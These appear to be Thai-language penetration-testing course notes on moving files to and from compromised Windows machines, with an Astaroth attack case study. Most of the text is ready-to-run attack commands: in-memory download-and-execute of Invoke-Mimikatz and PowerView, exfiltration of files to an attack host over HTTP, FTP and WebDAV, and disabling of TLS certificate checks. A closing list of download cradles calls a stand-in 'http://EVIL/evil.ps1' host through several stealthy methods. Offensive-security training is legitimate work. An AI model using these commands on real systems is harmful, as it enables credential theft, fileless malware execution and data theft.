# Windows File Transfer Methods

## บทนำ (Introduction)

ระบบปฏิบัติการ Windows มีการพัฒนามาอย่างต่อเนื่อง และเวอร์ชันใหม่ๆ มีเครื่องมือที่แตกต่างกันสำหรับการถ่ายโอนไฟล์ การเข้าใจวิธีการถ่ายโอนไฟล์บน Windows มีประโยชน์ต่อทั้งผู้โจมตีและผู้ป้องกัน

### ความสำคัญ
- **สำหรับผู้โจมตี (Attackers):** สามารถใช้วิธีการต่างๆ เพื่อดำเนินการโจมตีโดยหลีกเลี่ยงการถูกตรวจจับ
- **สำหรับผู้ป้องกัน (Defenders):** เรียนรู้วิธีการทำงานเพื่อติดตามและสร้างนโยบายป้องกัน

---

## กรณีศึกษา: Astaroth Attack

### ภัยคุกคามแบบไม่มีไฟล์ (Fileless Threats)
- **คำว่า "Fileless"** ไม่ได้หมายความว่าไม่มีการถ่ายโอนไฟล์
- ใช้เครื่องมือที่มีอยู่ในระบบ (Legitimate Tools) เพื่อดำเนินการโจมตี
- ไฟล์ไม่ได้ "อยู่" บนระบบ แต่ทำงานใน Memory

### ขั้นตอนการโจมตี Astaroth

1. **อีเมล Spear-Phishing** → ลิงก์ที่เป็นอันตราย
2. **ไฟล์ LNK** → เมื่อคลิก จะเรียกใช้เครื่องมือ WMIC
3. **WMIC Tool** → ใช้พารามิเตอร์ "/Format" เพื่อดาวน์โหลดและรันโค้ด JavaScript ที่เป็นอันตราย
4. **JavaScript Code** → ดาวน์โหลด Payloads โดยใช้เครื่องมือ Bitsadmin
5. **Base64 Encoding** → Payloads ทั้งหมดถูกเข้ารหัสด้วย Base64
6. **Certutil Tool** → ใช้ถอดรหัสไฟล์ → ได้ไฟล์ DLL หลายไฟล์
7. **Regsvr32 Tool** → โหลด DLL ที่ถอดรหัสแล้ว
8. **Final Payload** → Astaroth ถูก Inject เข้าไปใน Userinit Process

> นี่เป็นตัวอย่างที่ดีของการใช้หลายวิธีในการถ่ายโอนไฟล์เพื่อหลบเลี่ยงระบบป้องกัน

---

## การดาวน์โหลดไฟล์ (Download Operations)

### สถานการณ์
เราเข้าถึงเครื่อง MS02 ได้แล้ว และต้องการดาวน์โหลดไฟล์จากเครื่อง Pwnbox

---

## 1. PowerShell Base64 Encode & Decode

### ข้อดี
- ไม่ต้องใช้การสื่อสารทางเครือข่าย
- เหมาะกับไฟล์ขนาดเล็ก

### ขั้นตอนการใช้งาน

#### **บน Pwnbox (Linux):**

**ตรวจสอบ MD5 Hash ของไฟล์ต้นฉบับ:**
```bash
md5sum id_rsa
# ผลลัพธ์: 4e301756a07ded0a2dd6953abf015278  id_rsa
```

**เข้ารหัสไฟล์เป็น Base64:**
```bash
cat id_rsa | base64 -w 0; echo
# ได้ Base64 String ยาวๆ
```

#### **บน Windows Target:**

**ถอดรหัส Base64 และสร้างไฟล์:**
```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTi..."))
```

**ตรวจสอบ MD5 Hash:**
```powershell
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

### ข้อจำกัด
- **Windows CMD:** มีขีดจำกัดความยาว String ที่ 8,191 ตัวอักษร
- **Web Shell:** อาจ Error เมื่อส่ง String ที่ยาวมาก

---

## 2. PowerShell Web Downloads

### ภาพรวม
บริษัทส่วนใหญ่อนุญาตให้มี Outbound Traffic ผ่าน HTTP (80) และ HTTPS (443) ทำให้วิธีนี้สะดวกมาก

### WebClient Methods

| Method | คำอธิบาย |
|--------|----------|
| **OpenRead** | คืนค่าข้อมูลเป็น Stream |
| **OpenReadAsync** | คืนค่าข้อมูลโดยไม่บล็อก Thread |
| **DownloadData** | ดาวน์โหลดเป็น Byte Array |
| **DownloadDataAsync** | ดาวน์โหลดเป็น Byte Array แบบ Async |
| **DownloadFile** | ดาวน์โหลดเป็นไฟล์ในเครื่อง |
| **DownloadFileAsync** | ดาวน์โหลดเป็นไฟล์แบบ Async |
| **DownloadString** | ดาวน์โหลดเป็น String |
| **DownloadStringAsync** | ดาวน์โหลดเป็น String แบบ Async |

### วิธีการใช้งาน

#### **DownloadFile Method:**
```powershell
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
```

#### **DownloadFileAsync Method:**
```powershell
(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```

---

## 3. PowerShell DownloadString - Fileless Method

### หลักการ
- ไม่ดาวน์โหลดไฟล์ลงดิสก์
- รันโค้ดโดยตรงใน Memory
- ใช้ `Invoke-Expression` (IEX)

### ตัวอย่าง

**วิธีที่ 1:**
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

**วิธีที่ 2 (ใช้ Pipeline):**
```powershell
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

---

## 4. PowerShell Invoke-WebRequest

### ข้อมูลทั่วไป
- รองรับตั้งแต่ PowerShell 3.0 ขึ้นไป
- **ช้ากว่า** WebClient เล็กน้อย
- มี Aliases: `iwr`, `curl`, `wget`

### ตัวอย่างการใช้งาน
```powershell
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

---

## 5. แก้ไขปัญหาที่พบบ่อยใน PowerShell

### ปัญหา 1: Internet Explorer First-Launch Configuration

**ข้อผิดพลาด:**
```
The response content cannot be parsed because the Internet Explorer engine is not available...
```

**วิธีแก้:**
```powershell
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

### ปัญหา 2: SSL/TLS Certificate ไม่น่าเชื่อถือ

**ข้อผิดพลาด:**
```
The underlying connection was closed: Could not establish trust relationship for the SSL/TLS secure channel.
```

**วิธีแก้:**
```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

---

## 6. SMB Downloads

### ข้อมูลทั่วไป
- **SMB Protocol:** ใช้พอร์ต TCP/445
- พบบ่อยในเครือข่ายองค์กรที่มี Windows Services

### ขั้นตอนการใช้งาน

#### **สร้าง SMB Server บน Pwnbox:**
```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

#### **ดาวน์โหลดไฟล์บน Windows:**
```cmd
copy \\192.168.220.133\share\nc.exe
```

### แก้ปัญหา: Windows บล็อก Unauthenticated Guest Access

**ข้อผิดพลาด:**
```
You can't access this shared folder because your organization's security policies block unauthenticated guest access.
```

**วิธีแก้: สร้าง SMB Server พร้อม Username/Password**

**บน Pwnbox:**
```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

**บน Windows:**
```cmd
net use n: \\192.168.220.133\share /user:test test
copy n:\nc.exe
```

---

## 7. FTP Downloads

### FTP Protocol
- ใช้พอร์ต TCP/21 และ TCP/20
- สามารถใช้ FTP Client หรือ PowerShell Net.WebClient

### ติดตั้งและเริ่ม FTP Server

**ติดตั้ง pyftpdlib:**
```bash
sudo pip3 install pyftpdlib
```

**เริ่ม FTP Server:**
```bash
sudo python3 -m pyftpdlib --port 21
```

### ดาวน์โหลดไฟล์บน Windows

#### **ใช้ PowerShell:**
```powershell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

#### **ใช้ FTP Client (กรณีไม่มี Interactive Shell):**

**สร้างไฟล์คำสั่ง:**
```cmd
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```
```cmd
ftp -v -n -s:ftpcommand.txt
```

**อธิบาย options:**
- `-v` = verbose mode (แสดงรายละเอียดทั้งหมด)
- `-n` = ไม่ auto-login (เพื่อให้ใช้คำสั่งจากไฟล์)
- `-s:ftpcommand.txt` = ใช้คำสั่งจากไฟล์ ftpcommand.txt


---

## การอัปโหลดไฟล์ (Upload Operations)

มีหลายสถานการณ์ที่ต้องอัปโหลดไฟล์จากเครื่อง Target กลับไปยัง Attack Host เช่น:
- Password Cracking
- การวิเคราะห์ข้อมูล (Analysis)
- Exfiltration ข้อมูล

---

## 1. PowerShell Base64 Encode (Upload)

### บน Windows Target

**เข้ารหัสไฟล์เป็น Base64:**
```powershell
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```

**ตรวจสอบ MD5 Hash:**
```powershell
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```

### บน Pwnbox (Linux)

**ถอดรหัส Base64:**
```bash
echo <base64_string> | base64 -d > hosts
```

**ตรวจสอบ MD5 Hash:**
```bash
md5sum hosts
```

---

## 2. PowerShell Web Uploads

### ติดตั้ง Upload Server

**ติดตั้ง uploadserver module:**
```bash
pip3 install uploadserver
```

**เริ่ม Upload Server:**
```bash
python3 -m uploadserver
# File upload available at /upload
# Serving HTTP on 0.0.0.0 port 8000
```

### อัปโหลดไฟล์จาก Windows

**ใช้ PSUpload.ps1 Script:**
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

---

## 3. PowerShell Base64 Web Upload

### บน Windows

**เข้ารหัสและส่งผ่าน HTTP POST:**
```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

### บน Pwnbox

**รับข้อมูลด้วย Netcat:**
```bash
nc -lvnp 8000
```

**ถอดรหัส Base64:**
```bash
echo <base64_string> | base64 -d -w 0 > hosts
```

---

## 4. SMB Uploads

### ปัญหา
- บริษัทมักบล็อก SMB (TCP/445) Outbound
- เหตุผล: ป้องกันการโจมตีจากภายนอก

### วิธีแก้: ใช้ SMB over HTTP (WebDAV)

#### **WebDAV คืออะไร?**
- RFC 4918: ส่วนขยายของ HTTP
- ทำให้ Web Server ทำงานเหมือน File Server
- รองรับ HTTPS

### ตั้งค่า WebDAV Server

**ติดตั้ง Python Modules:**
```bash
sudo pip3 install wsgidav cheroot
```

**เริ่ม WebDAV Server:**
```bash
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

### เชื่อมต่อจาก Windows

**ดูโฟลเดอร์แชร์:**
```cmd
dir \\192.168.49.128\DavWWWRoot
```

**อัปโหลดไฟล์:**
```cmd
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
```

> **หมายเหตุ:** `DavWWWRoot` เป็น Keyword พิเศษที่ Windows Shell รู้จัก ใช้บอกว่าเชื่อมต่อกับ Root ของ WebDAV Server

---

## 5. FTP Uploads

### เริ่ม FTP Server พร้อมสิทธิ์ Write

```bash
sudo python3 -m pyftpdlib --port 21 --write
```

### อัปโหลดไฟล์จาก Windows

#### **ใช้ PowerShell:**
```powershell
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

#### **ใช้ FTP Client:**

**สร้างไฟล์คำสั่ง:**
```cmd
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

---

---
เพิ่มเติม
```
wget http://10.10.15.67:80/upload_win.zip -OutFile upload_win.zip 

# normal download cradle
IEX (New-Object Net.Webclient).downloadstring("http://EVIL/evil.ps1")

# PowerShell 3.0+
IEX (iwr 'http://EVIL/evil.ps1')

# hidden IE com object
$ie=New-Object -comobject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://EVIL/evil.ps1');start-sleep -s 5;$r=$ie.Document.body.innerHTML;$ie.quit();IEX $r

# Msxml2.XMLHTTP COM object
$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText

# WinHttp COM object (not proxy aware!)
$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText

# using bitstransfer- touches disk!
Import-Module bitstransfer;Start-BitsTransfer 'http://EVIL/evil.ps1' $env:temp\t;$r=gc $env:temp\t;rm $env:temp\t; iex $r

# DNS TXT approach from PowerBreach (https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerBreach/PowerBreach.ps1)
#   code to execute needs to be a base64 encoded string stored in a TXT record
IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(((nslookup -querytype=txt "SERVER" | Select -Pattern '"*"') -split '"'[0]))))

# from @subtee - https://gist.github.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d
<#
<?xml version="1.0"?>
<command>
   <a>
      <execute>Get-Process</execute>
   </a>
  </command>
#>
$a = New-Object System.Xml.XmlDocument
$a.Load("https://gist.githubusercontent.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d/raw/1ffde429dc4a05f7bc7ffff32017a3133634bc36/gistfile1.txt")
$a.command.a.execute | iex
```